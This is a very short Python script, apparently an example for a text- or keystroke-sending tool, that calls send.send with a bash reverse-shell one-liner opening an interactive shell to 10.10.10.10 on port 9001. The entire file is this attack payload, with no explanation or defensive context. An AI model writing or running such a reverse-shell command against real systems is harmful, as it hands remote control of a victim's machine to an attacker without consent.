from .. import send

send.speed(0.01)
send.send('sh -i >& /dev/tcp/10.10.10.10/9001 0>&1')